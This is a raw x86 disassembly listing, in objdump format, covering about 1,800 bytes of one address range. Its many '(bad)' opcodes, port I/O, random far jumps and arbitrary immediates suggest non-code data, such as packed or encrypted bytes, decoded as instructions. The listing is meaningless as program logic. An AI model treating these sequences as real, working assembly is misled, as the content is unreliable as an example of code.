  41c91f:	and    ah,dh
  41c921:	scas   eax,DWORD PTR es:[edi]
  41c922:	adc    al,0xd5
  41c924:	pusha  
  41c925:	dec    esi
  41c926:	push   0xffffffb1
  41c928:	push   0xffffff8d
  41c92a:	push   0xffffffef
  41c92c:	in     al,0x2e
  41c92e:	mov    eax,0x2116553e
  41c933:	(bad)  
  41c934:	and    BYTE PTR ds:[esi],bl
  41c937:	inc    ebx
  41c938:	scas   al,BYTE PTR es:[edi]
  41c939:	repnz nop
  41c93b:	or     eax,0x555fd3b0
  41c940:	in     al,0xc0
  41c942:	mov    eax,ds:0xaf7860f6
  41c947:	dec    eax
  41c948:	cmp    DWORD PTR [esp+eax*4],0x541c4c7c
  41c94f:	dec    edx
  41c950:	inc    ebx
  41c951:	das    
  41c952:	es test al,0xf8
  41c955:	lods   eax,DWORD PTR ds:[esi]
  41c956:	mov    ebx,0x1a215fc4
  41c95b:	push   edx
  41c95c:	mov    eax,0xae7e4906
  41c961:	xchg   DWORD PTR [esi+0x2f],eax
  41c964:	js     0x41c9a0
  41c966:	mov    bh,0xa1
  41c968:	adc    dl,dh
  41c96a:	popf   
  41c96b:	mov    dl,0x6f
  41c96d:	sbb    al,0x3a
  41c96f:	xchg   ecx,eax
  41c970:	push   ebp
  41c971:	mov    DWORD PTR [bp+di+0x47],edi
  41c975:	ins    DWORD PTR es:[edi],dx
  41c976:	push   ds
  41c977:	xchg   esi,eax
  41c978:	adc    al,BYTE PTR [ebp-0xba955b]
  41c97e:	or     dh,dl
  41c980:	inc    esi
  41c981:	xor    BYTE PTR ds:0x5413be80,0x70
  41c988:	xor    al,ch
  41c98a:	push   edx
  41c98b:	bnd jo 0x41c94d
  41c98e:	mov    ah,0x28
  41c990:	xchg   DWORD PTR [ebx+0x285a7476],ebp
  41c996:	pusha  
  41c997:	sbb    al,0xc0
  41c999:	adc    esi,DWORD PTR [edi-0x6]
  41c99c:	cli    
  41c99d:	fistp  QWORD PTR [edx]
  41c99f:	gs pop edi
  41c9a1:	sub    BYTE PTR [ecx-0x401ab15e],ch
  41c9a7:	and    BYTE PTR [eax],bh
  41c9a9:	xchg   ecx,eax
  41c9aa:	mov    dl,0x9b
  41c9ac:	adc    ebx,DWORD PTR [eax+0x4cc5e78a]
  41c9b2:	sbb    al,0x32
  41c9b4:	mov    DWORD PTR [ebp-0x4d],esp
  41c9b7:	xor    bl,BYTE PTR cs:[eax+ebp*4]
  41c9bb:	ins    DWORD PTR es:[edi],dx
  41c9bc:	xchg   ecx,eax
  41c9bd:	call   0xcd69:0x7ad127f4
  41c9c4:	jo     0x41c98b
  41c9c6:	data16 ds jne 0x41c982
  41c9ca:	jbe    0x41ca17
  41c9cc:	mov    ?,WORD PTR [ebx+0x3b]
  41c9cf:	int    0x56
  41c9d1:	jo     0x41c9b8
  41c9d3:	mov    eax,ds:0x8fe4e9cb
  41c9d8:	jmp    0xb9411909
  41c9dd:	int3   
  41c9de:	outs   dx,DWORD PTR ds:[esi]
  41c9df:	pop    esp
  41c9e0:	fild   WORD PTR [ecx]
  41c9e2:	mov    ch,0x34
  41c9e4:	ins    BYTE PTR es:[edi],dx
  41c9e5:	add    edi,DWORD PTR [ebp+0x53]
  41c9e8:	out    dx,eax
  41c9e9:	inc    edi
  41c9ea:	enter  0x562d,0x98
  41c9ee:	xor    eax,0xba0ce230
  41c9f3:	pop    ds
  41c9f4:	loopne 0x41ca02
  41c9f6:	mov    ds:0xdfb430a2,al
  41c9fb:	add    al,0x45
  41c9fd:	out    dx,al
  41c9fe:	xchg   edx,eax
  41c9ff:	aam    0x51
  41ca01:	stc    
  41ca02:	dec    ecx
  41ca03:	dec    ebx
  41ca04:	js     0x41ca62
  41ca06:	cmp    ch,BYTE PTR [ebp-0x27]
  41ca09:	adc    esi,DWORD PTR [ebx+0x9f5111]
  41ca0f:	xchg   ecx,eax
  41ca10:	out    0x22,eax
  41ca12:	or     esp,DWORD PTR [edi-0x38fc417a]
  41ca18:	jns    0x41ca74
  41ca1a:	test   al,0x2e
  41ca1c:	sub    dl,BYTE PTR [edx+0x74dffa72]
  41ca22:	pusha  
  41ca23:	xor    al,dl
  41ca25:	sbb    DWORD PTR [esi+ebp*4],esp
  41ca28:	xchg   DWORD PTR [ebp+0x707db892],ecx
  41ca2e:	inc    edx
  41ca2f:	xchg   DWORD PTR [edx+0x50ad88b1],esi
  41ca35:	push   eax
  41ca36:	mov    ebp,0xf2fb7dbc
  41ca3b:	in     eax,dx
  41ca3c:	add    BYTE PTR [ebx+0x1c49cec],ch
  41ca42:	shl    ecx,cl
  41ca44:	aad    0x7c
  41ca46:	fadd   QWORD PTR [eax+0x7744ef58]
  41ca4c:	es sub eax,0xfb658592
  41ca52:	inc    ecx
  41ca53:	fisttp WORD PTR [esi+eax*1+0x7be08f60]
  41ca5a:	repz sbb DWORD PTR [eax-0x1a],ebp
  41ca5e:	les    esi,FWORD PTR [eax+0x6]
  41ca61:	movzx  edi,WORD PTR [edi+0x32]
  41ca65:	or     DWORD PTR [edi+0x5544122d],ebx
  41ca6b:	or     al,0x1c
  41ca6d:	xchg   ecx,eax
  41ca6e:	int    0x85
  41ca70:	or     ch,BYTE PTR [eax]
  41ca72:	sub    al,0x75
  41ca74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca75:	in     eax,0xb8
  41ca77:	imul   ebx,DWORD PTR [edx-0x33ce6c0e],0x56
  41ca7e:	retf   0x2b73
  41ca81:	std    
  41ca82:	xor    cl,BYTE PTR [eax]
  41ca84:	pushf  
  41ca85:	sbb    BYTE PTR [edx-0x6586e40],cl
  41ca8b:	pusha  
  41ca8c:	mov    al,ds:0x19b761fd
  41ca91:	aas    
  41ca92:	push   ebp
  41ca93:	js     0x41caf2
  41ca95:	std    
  41ca96:	call   DWORD PTR [edi+0x6f24db28]
  41ca9c:	mov    cl,0xbc
  41ca9e:	jnp    0x41ca24
  41caa0:	pop    ecx
  41caa1:	xchg   BYTE PTR [ebp-0x5672e7a3],bl
  41caa7:	fistp  QWORD PTR [ecx+0x3165d690]
  41caad:	mov    ch,0xe7
  41caaf:	cdq    
  41cab0:	outs   dx,DWORD PTR ds:[esi]
  41cab1:	xchg   ecx,eax
  41cab2:	nop
  41cab3:	mov    edx,0xffa961a4
  41cab8:	es js  0x41ca52
  41cabb:	leave  
  41cabc:	jae    0x41cadb
  41cabe:	in     al,0x87
  41cac0:	pusha  
  41cac1:	dec    ebp
  41cac2:	cmp    ecx,DWORD PTR [eax+0x2ac85c0e]
  41cac8:	adc    DWORD PTR [esp+edx*2+0x5d],esi
  41cacc:	or     ch,BYTE PTR [edx-0x2f]
  41cacf:	adc    al,0xcd
  41cad1:	aam    0xeb
  41cad3:	ds sti 
  41cad5:	mov    bl,0xec
  41cad7:	jmp    0x41cb4e
  41cad9:	sbb    edi,eax
  41cadb:	push   ss
  41cadc:	dec    esi
  41cadd:	pop    ds
  41cade:	nop
  41cadf:	xchg   ecx,eax
  41cae0:	dec    ebx
  41cae1:	loope  0x41ca7a
  41cae3:	jle    0x41caa6
  41cae5:	mov    BYTE PTR [esi+0x6d926bd8],bh
  41caeb:	psrlw  mm4,mm0
  41caee:	adc    dl,BYTE PTR [edx]
  41caf0:	sbb    al,0x53
  41caf2:	loope  0x41cb64
  41caf4:	ja     0x41ca82
  41caf6:	or     dl,BYTE PTR [esi-0x7b]
  41caf9:	push   esi
  41cafa:	adc    DWORD PTR [esi+0x548e7964],edi
  41cb00:	(bad)  
  41cb01:	scas   eax,DWORD PTR es:[edi]
  41cb02:	mov    ecx,0x18d857b3
  41cb07:	outs   dx,DWORD PTR ds:[esi]
  41cb08:	jnp    0x41cb6d
  41cb0a:	dec    esi
  41cb0b:	je     0x41cb62
  41cb0d:	cmp    DWORD PTR [eax-0x7],ecx
  41cb10:	loope  0x41caac
  41cb12:	call   0x69384679
  41cb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb18:	aas    
  41cb19:	es mov ebx,0x83730146
  41cb1f:	xchg   esp,eax
  41cb20:	inc    edi
  41cb21:	jbe    0x41cad6
  41cb23:	sub    ebp,eax
  41cb25:	sub    DWORD PTR [edi+0x5d],ebp
  41cb28:	or     BYTE PTR [esi],cl
  41cb2a:	add    al,0x64
  41cb2c:	imul   edx,DWORD PTR [edx-0x45],0xfffffff5
  41cb30:	mov    ebx,0x8586db21
  41cb35:	(bad)
  41cb38:	xor    cl,0xeb
  41cb3b:	setb   BYTE PTR [eax-0x3e4a54b9]
  41cb42:	mov    ebx,0x8ea29e06
  41cb47:	gs add al,0x1a
  41cb4a:	push   ds
  41cb4b:	jp     0x41cb86
  41cb4d:	cmp    ch,BYTE PTR [edx-0x3b]
  41cb50:	or     esi,0x6a5bf327
  41cb56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb57:	ret    
  41cb58:	jmp    0x20ab:0x293891db
  41cb5f:	jg     0x41cb8e
  41cb61:	adc    DWORD PTR [edi+0x71],0xffffffb0
  41cb65:	leave  
  41cb66:	jb     0x41cb13
  41cb68:	xchg   esi,edx
  41cb6a:	shr    DWORD PTR [ebp+0x72741c3f],cl
  41cb70:	dec    ebx
  41cb71:	popf   
  41cb72:	push   edi
  41cb73:	aam    0x40
  41cb75:	jnp    0x41cb94
  41cb77:	cdq    
  41cb78:	in     eax,0xaf
  41cb7a:	scas   al,BYTE PTR es:[edi]
  41cb7b:	jge    0x41cb38
  41cb7d:	dec    esp
  41cb7e:	and    eax,0xb7d9e74f
  41cb83:	adc    cl,BYTE PTR [ebx]
  41cb85:	inc    ebx
  41cb86:	sbb    eax,0xd85d7a61
  41cb8b:	arpl   WORD PTR [esi],ax
  41cb8d:	cmp    bl,BYTE PTR ds:0xd7e7d949
  41cb93:	pop    gs
  41cb95:	mov    edx,0x93fcda6c
  41cb9a:	mov    ebp,0x83a8255f
  41cb9f:	push   ebx
  41cba0:	rol    edx,0xb1
  41cba3:	and    eax,0xd32b385c
  41cba8:	adc    BYTE PTR [ecx-0x2afff8b8],dh
  41cbae:	jne    0x41cbc3
  41cbb0:	mov    BYTE PTR [edx],bl
  41cbb2:	sub    eax,DWORD PTR [ebp-0x5f]
  41cbb5:	imul   ecx,DWORD PTR [ebx],0xe2264656
  41cbbb:	pop    ecx
  41cbbc:	pop    ebp
  41cbbd:	mov    ss,WORD PTR [ecx+0x3ea11dda]
  41cbc3:	in     eax,0x97
  41cbc5:	or     bl,dl
  41cbc7:	jns    0x41cbfa
  41cbc9:	jae    0x41cc14
  41cbcb:	lock cwde 
  41cbcd:	les    ecx,FWORD PTR [edi+0x4f]
  41cbd0:	in     eax,dx
  41cbd1:	fwait
  41cbd2:	mov    ebx,0xf4dfa4c7
  41cbd7:	inc    ebp
  41cbd8:	cmp    DWORD PTR [ebx-0x4aaf2902],0xffffffa3
  41cbdf:	into   
  41cbe0:	push   0x9fa5cf80
  41cbe5:	sbb    DWORD PTR [edi-0x41],ecx
  41cbe8:	xchg   ecx,eax
  41cbe9:	jge    0x41cc69
  41cbeb:	call   0xc18678ca
  41cbf0:	push   ds
  41cbf1:	push   esp
  41cbf2:	push   ebp
  41cbf3:	add    al,0xdb
  41cbf5:	sub    DWORD PTR [ecx],esp
  41cbf7:	sub    eax,0x4351eaef
  41cbfc:	inc    edi
  41cbfd:	mov    ah,0x45
  41cbff:	jbe    0x41cb97
  41cc01:	aaa    
  41cc02:	mov    esp,0x2d5d9811
  41cc07:	or     ebp,ecx
  41cc09:	pop    edx
  41cc0a:	pop    eax
  41cc0b:	mov    ebx,0x208377e8
  41cc10:	or     al,0x5d
  41cc12:	sbb    edx,DWORD PTR [ecx-0xa2ec930]
  41cc18:	pop    edx
  41cc19:	sbb    BYTE PTR ds:0x4c1b1fa2,dl
  41cc1f:	add    al,0x82
  41cc21:	and    ebx,DWORD PTR [ebx]
  41cc23:	jmp    FWORD PTR [eax]
  41cc25:	mov    ebp,edx
  41cc27:	or     ah,al
  41cc29:	in     al,0x91
  41cc2b:	dec    ecx
  41cc2c:	imul   DWORD PTR [ecx]
  41cc2e:	sub    al,0xc8
  41cc30:	xchg   esi,eax
  41cc31:	scas   eax,DWORD PTR es:[edi]
  41cc32:	bound  edi,QWORD PTR [ecx+0x6ea05efc]
  41cc38:	jmp    0x61f3:0x7c650bb6
  41cc3f:	ins    DWORD PTR es:[edi],dx
  41cc40:	ins    BYTE PTR es:[edi],dx
  41cc41:	pop    ds
  41cc42:	ret    
  41cc43:	mov    esp,0x784db923
  41cc48:	xchg   esp,eax
  41cc49:	pushf  
  41cc4a:	mov    edx,cs
  41cc4c:	scas   al,BYTE PTR es:[edi]
  41cc4d:	pop    ss
  41cc4e:	inc    ebp
  41cc4f:	repz imul ecx,ebp,0xffffffeb
  41cc53:	and    al,0x49
  41cc55:	aas    
  41cc56:	test   BYTE PTR [ebx+0x33],dl
  41cc59:	test   al,0x24
  41cc5b:	fadd   st,st(5)
  41cc5d:	jge    0x41cc8a
  41cc5f:	std    
  41cc60:	in     eax,0x7
  41cc62:	cmp    eax,0x918b75bd
  41cc67:	iret   
  41cc68:	xchg   esp,eax
  41cc69:	pop    ss
  41cc6a:	es test al,0xdb
  41cc6d:	jge    0x41cc01
  41cc6f:	(bad)  
  41cc71:	lods   al,BYTE PTR ds:[esi]
  41cc72:	and    DWORD PTR [ecx+0x1abc2161],esp
  41cc78:	imul   esp,DWORD PTR [esi],0xf
  41cc7b:	hlt    
  41cc7c:	push   0xb967634
  41cc81:	outs   dx,DWORD PTR ds:[esi]
  41cc82:	dec    ebp
  41cc83:	jns    0x41cc81
  41cc85:	and    bh,BYTE PTR [ebx+0x5f448138]
  41cc8b:	push   ebx
  41cc8c:	jecxz  0x41cc1e
  41cc8e:	xlat   BYTE PTR ds:[ebx]
  41cc8f:	stos   DWORD PTR es:[edi],eax
  41cc90:	jg     0x41ccc9
  41cc92:	or     dl,BYTE PTR [edi*2-0x445c1913]
  41cc99:	and    ebp,eax
  41cc9b:	push   ss
  41cc9c:	lea    ebp,[ecx]
  41cc9e:	or     al,cl
  41cca0:	inc    eax
  41cca1:	adc    dl,BYTE PTR [edi+0x16]
  41cca4:	stos   BYTE PTR es:[edi],al
  41cca5:	in     al,dx
  41cca6:	ins    DWORD PTR es:[edi],dx
  41cca7:	xchg   esp,eax
  41cca8:	push   ss
  41cca9:	and    eax,edx
  41ccab:	pop    edx
  41ccac:	rcl    DWORD PTR [edx+edx*1-0x4b],1
  41ccb0:	(bad)  
  41ccb1:	in     eax,dx
  41ccb2:	pop    esi
  41ccb3:	add    al,0xab
  41ccb5:	add    dh,0xdc
  41ccb8:	fistp  DWORD PTR [ecx]
  41ccba:	push   edx
  41ccbb:	icebp  
  41ccbc:	push   es
  41ccbd:	and    BYTE PTR ds:0xc11608d1,cl
  41ccc3:	dec    esp
  41ccc4:	cmc    
  41ccc5:	(bad)  
  41ccc6:	mov    ?,WORD PTR [ebx-0x4f]
  41ccc9:	js     0x41cd33
  41cccb:	fld    DWORD PTR [edi]
  41cccd:	pop    edi
  41ccce:	repnz sub al,0xd4
  41ccd1:	mov    edi,0x5c95e308
  41ccd6:	cli    
  41ccd7:	call   0xc89bbe84
  41ccdc:	and    bh,BYTE PTR [ebx]
  41ccde:	enter  0x3e40,0xb2
  41cce2:	into   
  41cce3:	fcmovne st,st(0)
  41cce5:	pop    ebp
  41cce6:	add    eax,0x4f513f0b
  41cceb:	push   eax
  41ccec:	faddp  st(1),st
  41ccee:	or     cl,BYTE PTR [eax+0x37]
  41ccf1:	push   ds
  41ccf2:	sbb    al,0x1e
  41ccf4:	retf   0x1d59
  41ccf7:	outs   dx,BYTE PTR ds:[esi]
  41ccf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccf9:	xlat   BYTE PTR ds:[ebx]
  41ccfa:	or     ebx,eax
  41ccfc:	lea    ebp,[ebx+0x7d]
  41ccff:	push   eax
  41cd00:	or     ebp,ecx
  41cd02:	mov    dh,0xfb
  41cd04:	and    DWORD PTR [edx+0x62],edi
  41cd07:	pop    ebx
  41cd08:	pop    es
  41cd09:	jno    0x41cd57
  41cd0b:	pop    edx
  41cd0c:	add    BYTE PTR ds:0xe6b1e74a,dh
  41cd12:	ss ins DWORD PTR es:[edi],dx
  41cd14:	aas    
  41cd15:	daa    
  41cd16:	cmp    dl,BYTE PTR [esi-0x14]
  41cd19:	add    ecx,DWORD PTR [ebx+0x3722504e]
  41cd1f:	and    al,0xc7
  41cd21:	sbb    al,0x85
  41cd23:	or     al,0x32
  41cd25:	push   eax
  41cd26:	in     al,dx
  41cd27:	add    eax,0x8e83af51
  41cd2c:	pop    edi
  41cd2d:	cmc    
  41cd2e:	scas   al,BYTE PTR es:[edi]
  41cd2f:	adc    ecx,esp
  41cd31:	add    BYTE PTR [ebx],cl
  41cd33:	ror    cl,1
  41cd35:	mov    dl,0x21
  41cd37:	ret    
  41cd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd39:	jg     0x41cd27
  41cd3b:	int    0x97
  41cd3d:	sar    BYTE PTR [esi],1
  41cd3f:	shl    ebx,0x5c
  41cd42:	mov    BYTE PTR [edi],bl
  41cd44:	sbb    bh,BYTE PTR [ecx+0x341367]
  41cd4a:	add    BYTE PTR [ebx-0x5237e3cc],ah
  41cd50:	dec    ebx
  41cd51:	jnp    0x41ccf7
  41cd53:	pop    esi
  41cd54:	and    bl,BYTE PTR [edi]
  41cd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd57:	or     dh,BYTE PTR [edx+0x22]
  41cd5a:	sbb    eax,0xf0922870
  41cd5f:	xchg   esp,eax
  41cd60:	nop    DWORD PTR [eax+0x1a]
  41cd64:	xchg   BYTE PTR [edx-0x6aa04d8b],bh
  41cd6a:	mov    al,ds:0x1d15629f
  41cd6f:	mov    al,cl
  41cd71:	add    al,0xed
  41cd73:	cmp    DWORD PTR ds:0xcec22a57,ebx
  41cd79:	aas    
  41cd7a:	retf   
  41cd7b:	in     al,dx
  41cd7c:	pop    eax
  41cd7d:	push   edi
  41cd7e:	inc    ecx
  41cd7f:	cmp    ecx,DWORD PTR [eax+0x3e083c87]
  41cd85:	push   esp
  41cd86:	cmp    DWORD PTR [ecx],0xffffffc8
  41cd89:	scas   al,BYTE PTR es:[edi]
  41cd8a:	jae    0x41cd42
  41cd8c:	jp     0x41cdb9
  41cd8e:	out    0xb0,eax
  41cd90:	imul   edx,ecx,0xc7dfa205
  41cd96:	out    dx,eax
  41cd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd98:	xchg   edx,eax
  41cd99:	xchg   ebp,eax
  41cd9a:	xchg   ecx,eax
  41cd9b:	daa    
  41cd9c:	test   eax,0xe0084e2
  41cda1:	xchg   BYTE PTR [ebp+0x304e75a9],bh
  41cda7:	ret    0xc3b1
  41cdaa:	test   BYTE PTR [ebp+ecx*1+0x11e37e43],cl
  41cdb1:	push   esp
  41cdb2:	cs ins BYTE PTR es:[edi],dx
  41cdb4:	std    
  41cdb5:	push   eax
  41cdb6:	mov    WORD PTR ds:[ebp+ebx*1+0x5b],cs
  41cdbb:	mov    ds,WORD PTR [eax]
  41cdbd:	pop    esp
  41cdbe:	jp     0x41cd96
  41cdc0:	cmp    DWORD PTR [esi-0x15],0xaf99fb5f
  41cdc7:	sar    DWORD PTR [ebp+0x6b],0x5b
  41cdcb:	sbb    esp,DWORD PTR [edx+0x70]
  41cdce:	dec    edi
  41cdcf:	or     DWORD PTR [ebx+ebx*8],ebx
  41cdd2:	pop    ecx
  41cdd3:	jg     0x41cdbc
  41cdd5:	mov    ebx,0xb04de8b3
  41cdda:	jb     0x41cdbd
  41cddc:	adc    al,0x4c
  41cdde:	or     BYTE PTR [esi],0x8a
  41cde1:	stos   BYTE PTR es:[edi],al
  41cde2:	xor    al,0x64
  41cde4:	mov    ecx,0x388a997b
  41cde9:	out    0x80,al
  41cdeb:	popf   
  41cdec:	shr    BYTE PTR [eax+0x67],cl
  41cdef:	sub    cl,0x7
  41cdf2:	pop    ebp
  41cdf3:	push   es
  41cdf4:	mov    gs,ebp
  41cdf6:	cmp    cl,BYTE PTR [esi+0x5c8a8123]
  41cdfc:	mov    esp,0x7f3ef1ce
  41ce01:	pop    ecx
  41ce02:	sbb    al,0xb0
  41ce04:	jg     0x41cdf1
  41ce06:	scas   al,BYTE PTR es:[edi]
  41ce07:	mov    cl,0xc2
  41ce09:	dec    edi
  41ce0a:	add    cl,BYTE PTR [ebx]
  41ce0c:	lea    ebp,[ebx]
  41ce0e:	pop    eax
  41ce0f:	jo     0x41cdff
  41ce11:	inc    ebx
  41ce12:	call   0xb2db:0x43dca537
  41ce19:	ds jle 0x41ce8a
  41ce1c:	xor    ebx,DWORD PTR [ebp-0x32]
  41ce1f:	pop    ebx
  41ce20:	pop    edx
  41ce21:	iret   
  41ce22:	push   ebx
  41ce23:	inc    edx
  41ce24:	in     eax,0x41
  41ce26:	dec    edi
  41ce27:	sahf   
  41ce28:	pop    ebp
  41ce29:	push   ecx
  41ce2a:	pop    esi
  41ce2b:	jmp    0xe6a7:0x866accea
  41ce32:	mov    esi,0xab45f40a
  41ce37:	fidiv  WORD PTR [esi]
  41ce39:	mov    ebp,0x1be93931
  41ce3e:	and    eax,ebp
  41ce40:	lea    eax,[edx+0x7b]
  41ce43:	sbb    BYTE PTR [eax],ah
  41ce45:	pop    ebx
  41ce46:	fisub  WORD PTR [esi-0x278e04cd]
  41ce4c:	sahf   
  41ce4d:	gs out 0xec,al
  41ce50:	cdq    
  41ce51:	es pusha 
  41ce53:	outs   dx,DWORD PTR ds:[esi]
  41ce54:	jae    0x41cdec
  41ce56:	xor    esp,DWORD PTR [eax]
  41ce58:	jmp    0xec98:0x763bb32d
  41ce5f:	jge    0x41ceb4
  41ce61:	fucomip st,st(0)
  41ce63:	sbb    al,0x65
  41ce65:	call   DWORD PTR [esi]
  41ce67:	aaa    
  41ce68:	std    
  41ce69:	mov    ch,0x1e
  41ce6b:	mov    ebp,0x54433347
  41ce70:	fbld   TBYTE PTR [ebp+0x75]
  41ce73:	jno    0x41cee8
  41ce75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce76:	std    
  41ce77:	leave  
  41ce78:	pop    es
  41ce79:	aad    0xe9
  41ce7b:	test   DWORD PTR [edx+0x54],edi
  41ce7e:	pop    edx
  41ce7f:	sbb    al,0x70
  41ce81:	jg     0x41cefb
  41ce83:	retf   
  41ce84:	xchg   ebp,eax
  41ce85:	arpl   WORD PTR [ecx-0x1f],bp
  41ce88:	jmp    0x41ceec
  41ce8a:	mov    edi,0x712e54a4
  41ce8f:	xchg   ebp,eax
  41ce90:	jmp    0x81dc:0x3fc19021
  41ce97:	jl     0x41ce52
  41ce99:	retf   
  41ce9a:	test   al,0xa8
  41ce9c:	sbb    ebx,DWORD PTR [ebx]
  41ce9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce9f:	aam    0x71
  41cea1:	inc    eax
  41cea2:	sbb    ebx,eax
  41cea4:	sti    
  41cea5:	mov    ebp,0xf12d734b
  41ceaa:	outs   dx,DWORD PTR ds:[esi]
  41ceab:	lahf   
  41ceac:	pop    ebx
  41cead:	mov    ebx,0xa82f4db9
  41ceb2:	and    eax,0x3d115f2d
  41ceb7:	mov    bl,0x7e
  41ceb9:	dec    edi
  41ceba:	cmp    esp,DWORD PTR [eax+ecx*1-0x3af8dc82]
  41cec1:	jge    0x41cefd
  41cec3:	pop    esp
  41cec4:	fwait
  41cec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec6:	pushf  
  41cec7:	out    dx,eax
  41cec8:	jbe    0x41cf0f
  41ceca:	push   cs
  41cecb:	push   ebp
  41cecc:	and    edi,esp
  41cece:	dec    esp
  41cecf:	aaa    
  41ced0:	sub    al,0x3f
  41ced2:	aas    
  41ced3:	push   ebx
  41ced4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ced5:	sar    BYTE PTR [eax+0x3594da26],cl
  41cedb:	push   edx
  41cedc:	push   ebx
  41cedd:	push   ebp
  41cede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cedf:	ror    BYTE PTR [ebx],1
  41cee1:	scas   al,BYTE PTR es:[edi]
  41cee2:	mov    ebx,0xdd024d5c
  41cee7:	sub    eax,0xb71beb3e
  41ceec:	pop    esi
  41ceed:	xchg   esi,eax
  41ceee:	xor    ebx,DWORD PTR [ecx-0x5b]
  41cef1:	dec    esp
  41cef2:	adc    DWORD PTR [ebx-0x41],0xfffffff6
  41cef6:	inc    edi
  41cef7:	sar    DWORD PTR [ecx+0x14335b3a],0x13
  41cefe:	inc    ecx
  41ceff:	sub    dh,ah
  41cf01:	(bad)  
  41cf02:	rcr    ebx,1
  41cf04:	ss in  al,dx
  41cf06:	and    edx,DWORD PTR [esi+0x1601ce6]
  41cf0c:	xchg   edx,eax
  41cf0d:	mov    ch,0x4c
  41cf0f:	dec    ebx
  41cf10:	(bad)  
  41cf11:	xor    eax,0xa2e097c6
  41cf16:	jl     0x41ceec
  41cf18:	out    0x76,eax
  41cf1a:	enter  0x2c01,0x42
  41cf1e:	fwait
  41cf1f:	cwde   
  41cf20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf21:	fild   DWORD PTR [edx+0x7a8126df]
  41cf27:	sub    al,0x31
  41cf29:	outs   dx,BYTE PTR ds:[esi]
  41cf2a:	xchg   edx,eax
  41cf2b:	sub    edi,DWORD PTR [edx+0x5ac3b410]
  41cf31:	adc    eax,0xd00ef762
  41cf36:	inc    ebp
  41cf37:	loopne 0x41cf13
  41cf39:	inc    ebp
  41cf3a:	push   edi
  41cf3b:	fimul  WORD PTR [ecx-0x65]
  41cf3e:	aam    0x1e
  41cf40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf41:	ds stc 
  41cf43:	leave  
  41cf44:	sub    eax,0x2fccef29
  41cf49:	mov    ebp,ebp
  41cf4b:	jmp    0x6e66d9ed
  41cf50:	jle    0x41cf8c
  41cf52:	and    al,0x9f
  41cf54:	inc    eax
  41cf55:	lds    eax,FWORD PTR [edi-0x29]
  41cf58:	xchg   ebx,eax
  41cf59:	and    DWORD PTR [ebx-0x2b],ebp
  41cf5c:	push   ss
  41cf5d:	fild   QWORD PTR [ebx+0x12]
  41cf60:	mov    ebx,0xd731eea9
  41cf65:	retf   0xd03c
  41cf68:	or     bh,dl
  41cf6a:	sub    BYTE PTR [eax+0x25ff1ff0],dl
  41cf70:	scas   al,BYTE PTR es:[edi]
  41cf71:	test   DWORD PTR [ecx+0x19477598],ebx
  41cf77:	mov    cl,0x4f
  41cf79:	and    cl,BYTE PTR [esi-0x728a95da]
  41cf7f:	scas   al,BYTE PTR es:[edi]
  41cf80:	inc    esp
  41cf81:	push   ecx
  41cf82:	lea    edx,[ebx-0x40e40d4f]
  41cf88:	daa    
  41cf89:	mov    cl,BYTE PTR [edx]
  41cf8b:	or     bh,bh
  41cf8d:	xor    DWORD PTR [ebx],ebx
  41cf8f:	cwde   
  41cf90:	dec    esp
  41cf91:	out    dx,al
  41cf92:	xchg   ah,bh
  41cf94:	jo     0x41cffd
  41cf96:	pop    ebx
  41cf97:	push   esp
  41cf98:	fwait
  41cf99:	das    
  41cf9a:	sub    edx,esp
  41cf9c:	sbb    DWORD PTR ds:0xae3f47ef,edi
  41cfa2:	adc    edx,DWORD PTR [edi-0x5f95010a]
  41cfa8:	mov    al,0x83
  41cfaa:	fwait
  41cfab:	jge    0x41d012
  41cfad:	jae    0x41cfd0
  41cfaf:	push   edx
  41cfb0:	imul   edi,DWORD PTR [ebx-0x2f],0x71
  41cfb4:	add    al,0xea
  41cfb6:	scas   eax,DWORD PTR es:[edi]
  41cfb7:	jmp    0x41cfb0
  41cfb9:	(bad)  
  41cfba:	fidivr DWORD PTR [esi]
  41cfbc:	xor    ah,bh
  41cfbe:	push   ss
  41cfbf:	sbb    eax,0x4038170e
  41cfc4:	xchg   ch,bl
  41cfc6:	aas    
  41cfc7:	(bad)  [edi]
  41cfc9:	jns    0x41d027
  41cfcb:	cli    
  41cfcc:	xchg   ebp,eax
  41cfcd:	inc    ebp
  41cfce:	repnz mov al,ds:0x37322dfc
  41cfd4:	dec    ebx
  41cfd5:	pop    edi
  41cfd6:	adc    DWORD PTR [eax],esp
  41cfd8:	sbb    eax,0xf593f35f
  41cfdd:	pop    es
  41cfde:	std    
  41cfdf:	ret    0xb94c
  41cfe2:	cwde   
  41cfe3:	mov    eax,0x6b683da7
  41cfe8:	clc    
  41cfe9:	jl     0x41cfd1
  41cfeb:	adc    BYTE PTR ss:[ebp+0x183e0273],ah
  41cff2:	push   eax
  41cff3:	xchg   edx,eax
  41cff4:	iret   
  41cff5:	aad    0x1c
  41cff7:	or     eax,0xdc747008
  41cffc:	jb     0x41cfd7
  41cffe:	pop    ebx
  41cfff:	pop    esi
  41d000:	dec    edi
  41d001:	xor    cl,bh
  41d003:	and    BYTE PTR [eax],0xa0
  41d006:	add    eax,0x765bbc6a
  41d00b:	ret    
  41d00c:	or     al,BYTE PTR [esi-0x3ac510]
  41d012:	xchg   edi,eax
  41d013:	ins    DWORD PTR es:[edi],dx
  41d014:	ror    BYTE PTR [ecx+0x4b],0xeb
  41d018:	stc    
  41d019:	push   es
  41d01a:	in     eax,dx
  41d01b:	in     al,dx
  41d01c:	int3   
  41d01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d01e:	fldenv [esi+0x1c877a82]
  41d024:	pop    esi
  41d025:	push   0x4fc68e42
  41d02a:	iret   
  41d02b:	jbe    0x41cfb8
